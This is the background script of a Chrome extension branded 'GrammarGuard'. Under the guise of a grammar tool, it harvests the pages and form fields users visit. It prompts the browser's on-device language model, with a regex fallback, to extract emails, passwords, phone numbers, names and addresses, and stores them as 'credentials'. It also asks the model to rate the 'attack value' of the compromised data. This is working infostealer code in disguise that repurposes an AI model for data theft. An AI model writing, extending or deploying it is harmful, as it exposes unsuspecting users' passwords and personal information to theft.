
// AI-POWERED INTELLIGENT EXTRACTION ENGINE


let collectedData = {
  intelligentExtractions: [],
  rawPages: [],
  credentials: [],
  personalInfo: [],
  threats: [],
  apiStatus: {
    lastCheck: null,
    languageModel: 'unknown',
    summarizer: 'unknown'
  }
};

const processedPages = new Set(); 
const extractedData = new Set();  
const pageScanCounts = new Map(); 

chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ collectedData: collectedData });
  console.log('[GrammarGuard] 🚀 Intelligent extraction engine initialized v3.0');
  checkAPIStatus();
});

async function checkAPIStatus() {
  try {
    const lm = await LanguageModel.availability();
    const sum = await Summarizer.availability();
    collectedData.apiStatus = {
      lastCheck: Date.now(),
      languageModel: lm,
      summarizer: sum
    };
    console.log('[GrammarGuard] ✅ API Status:', collectedData.apiStatus);
  } catch (e) {
    console.error('[GrammarGuard] ❌ API check failed:', e);
  }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'INTELLIGENT_SCAN') {
    handleIntelligentScan(message.data);
  } else if (message.type === 'GET_DASHBOARD_DATA') {
    sendResponse({ data: collectedData });
  } else if (message.type === 'CLEAR_DATA') {
    collectedData = {
      intelligentExtractions: [],
      rawPages: [],
      credentials: [],
      personalInfo: [],
      threats: [],
      apiStatus: collectedData.apiStatus
    };
    processedPages.clear();
    extractedData.clear();
    pageScanCounts.clear();
    chrome.storage.local.set({ collectedData: collectedData });
    sendResponse({ success: true });
  }
  return true;
});


async function handleIntelligentScan(pageData) {
 
  const cleanUrl = pageData.url.split('?')[0].split('#')[0];
  const basePageId = `${pageData.domain}-${cleanUrl}`;
  
  
  const currentCount = pageScanCounts.get(basePageId) || 0;
  const MAX_SCANS = 5; 
  
  if (pageData.trigger === 'initial') {
    
    if (processedPages.has(`${basePageId}-initial`)) {
      console.log('[GrammarGuard] ⏭️ Skipping duplicate initial scan:', pageData.domain);
      return;
    }
    processedPages.add(`${basePageId}-initial`);
    
  } else if (pageData.trigger === 'user-interaction' || pageData.trigger === 'user-input') {
    
    if (currentCount >= MAX_SCANS) {
      console.log('[GrammarGuard] ⏭️ Max scans reached for:', pageData.domain);
      return;
    }
    
    console.log('[GrammarGuard] 🔄 Re-scan triggered by:', pageData.trigger, `(#${currentCount + 1})`);
    
  } else if (pageData.trigger === 'mutation') {
    
    if (currentCount >= 3) {
      console.log('[GrammarGuard] ⏭️ Max mutation scans reached:', pageData.domain);
      return;
    }
  }
  
  
  pageScanCounts.set(basePageId, currentCount + 1);
  
  
  if (!pageData.visibleText || pageData.visibleText.length < 100) {
    console.log('[GrammarGuard] ⏭️ Skipping: Insufficient content (<100 chars)');
    return;
  }
  
  
  const meaningfulContent = pageData.visibleText.replace(/\s+/g, ' ').trim();
  if (meaningfulContent.length < 50) {
    console.log('[GrammarGuard] ⏭️ Skipping: No meaningful content');
    return;
  }
  
  console.log('[GrammarGuard] 🧠 Processing:', pageData.domain);
  console.log('[GrammarGuard] 📊 Trigger:', pageData.trigger);
  console.log('[GrammarGuard] 📄 Content length:', pageData.visibleText.length);
  console.log('[GrammarGuard] 📝 Form fields:', pageData.formData?.length || 0);
  
  
  if (pageData.formData && pageData.formData.length > 0) {
    console.log('[GrammarGuard] 📋 Form data detected:');
    pageData.formData.forEach(field => {
      const valuePreview = field.value.substring(0, 20);
      console.log(`  - ${field.type}: "${field.label || field.name}" = "${valuePreview}..." (visible: ${field.isVisible})`);
    });
  }
  
 
  collectedData.rawPages.push({
    url: pageData.url,
    domain: pageData.domain,
    title: pageData.title,
    timestamp: pageData.timestamp,
    pageType: pageData.pageType,
    trigger: pageData.trigger,
    scanNumber: currentCount + 1
  });
  
  
  await extractSensitiveDataWithAI(pageData);
  
  
  if (pageData.trigger === 'initial' && collectedData.intelligentExtractions.length > 0) {
    await compressPageContent(pageData);
  }
  
  
  if (collectedData.rawPages.length % 5 === 0) {
    await assessThreatValue(pageData);
  }
  
  chrome.storage.local.set({ collectedData: collectedData });
}

async function extractSensitiveDataWithAI(pageData) {
  try {
    const availability = await LanguageModel.availability();
    
    if (availability === 'no' || availability === 'after-download') {
      console.log('[GrammarGuard] ⚠️ LanguageModel not available, using regex fallback');
      return extractWithoutAI(pageData);
    }
    
    console.log('[GrammarGuard] 🤖 Using AI for extraction...');
    
    const session = await LanguageModel.create({
      temperature: 0.1,
      topK: 1,
      systemPrompt: `You are a JSON extraction bot. You MUST return ONLY valid JSON. No explanations. No extra text. ONLY JSON.`,
      language: 'en'
    });
    
  
    const textSample = pageData.visibleText.substring(0, 5000);
    
    
    let formFieldsText = '';
    if (pageData.formData && pageData.formData.length > 0) {
      formFieldsText = '\n\nForm Fields:\n';
      pageData.formData.forEach(field => {
        if (field.value && field.value.length > 0) {
          formFieldsText += `${field.label || field.name || field.type}: ${field.value}\n`;
        }
      });
    }
    
    const combinedContent = textSample + formFieldsText;
    
    const prompt = `Extract sensitive data from this page and return ONLY valid JSON. No extra text.

Content:
${combinedContent}

Return EXACTLY this format:
{
  "emails": ["user@example.com"],
  "passwords": [],
  "phones": ["+1234567890"],
  "names": ["Full Name"],
  "addresses": ["123 Street City"]
}

IMPORTANT: Return ONLY the JSON object. No explanations. If nothing found, return empty arrays.`;
    
    console.log('[GrammarGuard] 📤 Sending to AI... (content length:', combinedContent.length, ')');
    const response = await session.prompt(prompt);
    session.destroy();
    
    console.log('[GrammarGuard] 📥 AI response:', response.substring(0, 150) + '...');
    
    
    let extracted;
    try {
      extracted = JSON.parse(response);
    } catch (e1) {
      const jsonMatch = response.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        try {
          extracted = JSON.parse(jsonMatch[0]);
        } catch (e2) {
          console.error('[GrammarGuard] ❌ JSON parse failed, using regex fallback');
          return extractWithoutAI(pageData);
        }
      } else {
        console.error('[GrammarGuard] ❌ No JSON found in response');
        return extractWithoutAI(pageData);
      }
    }
    
    
    const cleanData = {
      emails: (extracted.emails || []).filter(e => 
        e &&
        !e.includes('example.com') && 
        !e.includes('user@') &&
        !e.includes('email@') &&
        e.includes('@') &&
        e.length > 5
      ),
      passwords: (extracted.passwords || []).filter(p => 
        p && p.length > 3 
      ),
      phones: (extracted.phones || []).filter(p => 
        p &&
        !p.includes('1234567890') &&
        !p.includes('+1234567890') &&
        p.replace(/\D/g, '').length >= 10
      ),
      names: (extracted.names || []).filter(n => 
        n &&
        n !== 'Full Name' &&
        n !== 'User' &&
        n !== 'Name' &&
        n.length > 2
      ),
      addresses: (extracted.addresses || []).filter(a => 
        a &&
        a !== '123 Street City' &&
        a !== 'Address' &&
        a.length > 10 
      )
    };
    
    console.log('[GrammarGuard] 🔍 Filtered results:', {
      emails: cleanData.emails.length,
      passwords: cleanData.passwords.length,
      phones: cleanData.phones.length,
      names: cleanData.names.length,
      addresses: cleanData.addresses.length
    });
    
    
    const hasRealData = cleanData.emails.length > 0 ||
                       cleanData.passwords.length > 0 ||
                       cleanData.phones.length > 0 ||
                       cleanData.addresses.length > 0;
    
    if (!hasRealData) {
      console.log('[GrammarGuard] ⏭️ No real data found, skipping storage');
      return;
    }
    
    
    const newCredentials = [];
    
    cleanData.emails.forEach(email => {
      const key = `email:${email.toLowerCase()}`;
      if (!extractedData.has(key)) {
        extractedData.add(key);
        newCredentials.push({ 
          type: 'email', 
          value: email,
          context: `Found on ${pageData.domain} (${pageData.trigger})`
        });
      }
    });
    
    cleanData.passwords.forEach(pw => {
      const key = `password:${pw}`;
      if (!extractedData.has(key)) {
        extractedData.add(key);
        newCredentials.push({ 
          type: 'password', 
          value: pw,
          context: `Found on ${pageData.domain} (${pageData.trigger})`
        });
      }
    });
    
    cleanData.phones.forEach(phone => {
      const normalizedPhone = phone.replace(/\D/g, '');
      const key = `phone:${normalizedPhone}`;
      if (!extractedData.has(key)) {
        extractedData.add(key);
        newCredentials.push({ 
          type: 'phone', 
          value: phone,
          context: `Found on ${pageData.domain} (${pageData.trigger})`
        });
      }
    });
    
    if (newCredentials.length > 0) {
      collectedData.credentials.push({
        website: pageData.domain,
        timestamp: Date.now(),
        data: newCredentials,
        extractionMethod: 'AI',
        trigger: pageData.trigger
      });
      console.log('[GrammarGuard] 🔑 NEW CREDENTIALS:', newCredentials.length, 'items');
      
      newCredentials.forEach(cred => {
        console.log(`  ✅ ${cred.type.toUpperCase()}: ${cred.value}`);
      });
    }
    
    
    const newPersonalInfo = [];
    
    cleanData.names.forEach(name => {
      const key = `name:${name.toLowerCase()}`;
      if (!extractedData.has(key)) {
        extractedData.add(key);
        newPersonalInfo.push({ type: 'name', value: name });
      }
    });
    
    cleanData.addresses.forEach(addr => {
      const key = `address:${addr.toLowerCase()}`;
      if (!extractedData.has(key)) {
        extractedData.add(key);
        newPersonalInfo.push({ type: 'address', value: addr });
      }
    });
    
    if (newPersonalInfo.length > 0) {
      collectedData.personalInfo.push({
        website: pageData.domain,
        timestamp: Date.now(),
        data: newPersonalInfo,
        extractionMethod: 'AI',
        trigger: pageData.trigger
      });
      console.log('[GrammarGuard] 👤 NEW PERSONAL INFO:', newPersonalInfo.length, 'items');
      
      newPersonalInfo.forEach(info => {
        console.log(`  ✅ ${info.type.toUpperCase()}: ${info.value}`);
      });
    }
    
    
    if (newCredentials.length > 0 || newPersonalInfo.length > 0) {
      collectedData.intelligentExtractions.push({
        website: pageData.domain,
        url: pageData.url,
        timestamp: Date.now(),
        extracted: cleanData,
        aiProcessed: true,
        trigger: pageData.trigger
      });
    }
    
  } catch (e) {
    console.error('[GrammarGuard] ❌ AI extraction error:', e);
    extractWithoutAI(pageData);
  }
}

function extractWithoutAI(pageData) {
  console.log('[GrammarGuard] 📝 Using regex fallback...');
  
  const text = pageData.visibleText;
  
  
  let combinedText = text;
  if (pageData.formData && pageData.formData.length > 0) {
    pageData.formData.forEach(field => {
      if (field.value) {
        combinedText += ' ' + field.value;
      }
    });
  }
  
  
  const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
  const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
  
  const emails = [...new Set(combinedText.match(emailRegex) || [])];
  const phones = [...new Set(combinedText.match(phoneRegex) || [])];
  
  const cleanEmails = emails.filter(e => 
    !e.includes('example.com') &&
    !e.includes('noreply') &&
    e.length > 5
  );
  
  const cleanPhones = phones.filter(p => 
    p.replace(/\D/g, '').length >= 10
  );
  
  if (cleanEmails.length === 0 && cleanPhones.length === 0) {
    console.log('[GrammarGuard] ⏭️ No data found with regex');
    return;
  }
  
  const newCredentials = [];
  
  cleanEmails.forEach(email => {
    const key = `email:${email.toLowerCase()}`;
    if (!extractedData.has(key)) {
      extractedData.add(key);
      newCredentials.push({
        type: 'email',
        value: email,
        context: 'Found via regex'
      });
    }
  });
  
  cleanPhones.forEach(phone => {
    const normalizedPhone = phone.replace(/\D/g, '');
    const key = `phone:${normalizedPhone}`;
    if (!extractedData.has(key)) {
      extractedData.add(key);
      newCredentials.push({
        type: 'phone',
        value: phone,
        context: 'Found via regex'
      });
    }
  });
  
  if (newCredentials.length > 0) {
    collectedData.credentials.push({
      website: pageData.domain,
      timestamp: Date.now(),
      data: newCredentials,
      extractionMethod: 'Regex'
    });
    
    collectedData.intelligentExtractions.push({
      website: pageData.domain,
      url: pageData.url,
      timestamp: Date.now(),
      extracted: { emails: cleanEmails, phones: cleanPhones },
      aiProcessed: false
    });
    
    console.log('[GrammarGuard] ✅ Regex extraction:', newCredentials.length, 'items');
  }
}

async function compressPageContent(pageData) {
  try {
    const availability = await Summarizer.availability();
    
    if (availability === 'no' || availability === 'after-download') {
      return;
    }
    
    console.log('[GrammarGuard] 🗜️ Compressing content...');
    
    const session = await Summarizer.create({
      type: 'key-points',
      format: 'plain-text',
      length: 'short',
      sharedContext: 'Extract only sensitive or valuable information'
    });
    
    const textToCompress = pageData.visibleText.substring(0, 10000);
    const compressed = await session.summarize(textToCompress);
    session.destroy();
    
    const reductionPercent = Math.round((1 - compressed.length/textToCompress.length) * 100);
    console.log('[GrammarGuard] ✅ Compression:', textToCompress.length, '→', compressed.length, 'bytes (', reductionPercent, '% reduction)');
    
    if (collectedData.intelligentExtractions.length > 0) {
      const lastIndex = collectedData.intelligentExtractions.length - 1;
      collectedData.intelligentExtractions[lastIndex].compressed = compressed;
      collectedData.intelligentExtractions[lastIndex].compressionRatio = reductionPercent;
    }
    
  } catch (e) {
    console.error('[GrammarGuard] ❌ Compression error:', e);
  }
}

async function assessThreatValue(pageData) {
  try {
    const availability = await LanguageModel.availability();
    
    if (availability === 'no' || availability === 'after-download') {
      return;
    }
    
    console.log('[GrammarGuard] 🎯 Assessing threat value...');
    
    const session = await LanguageModel.create({
      temperature: 0.7,
      topK: 3,
      systemPrompt: "You are a cybersecurity threat analyst. Assess attack value of compromised data. Be concise.",
      language: 'en'
    });
    
    const prompt = `Assess attack value:

Domain: ${pageData.domain}
Type: ${pageData.pageType}
Content: ${pageData.visibleText.substring(0, 500)}

Provide:
1. Threat Level: Critical/High/Medium/Low
2. Value: $$$$ / $$$ / $$ / $
3. Action: (1 sentence)

Be brief.`;
    
    const assessment = await session.prompt(prompt);
    session.destroy();
    
    collectedData.threats.push({
      website: pageData.domain,
      timestamp: Date.now(),
      assessment: assessment
    });
    
    console.log('[GrammarGuard] ✅ Threat assessed');
    
  } catch (e) {
    console.error('[GrammarGuard] ❌ Threat assessment error:', e);
  }
}

checkAPIStatus();
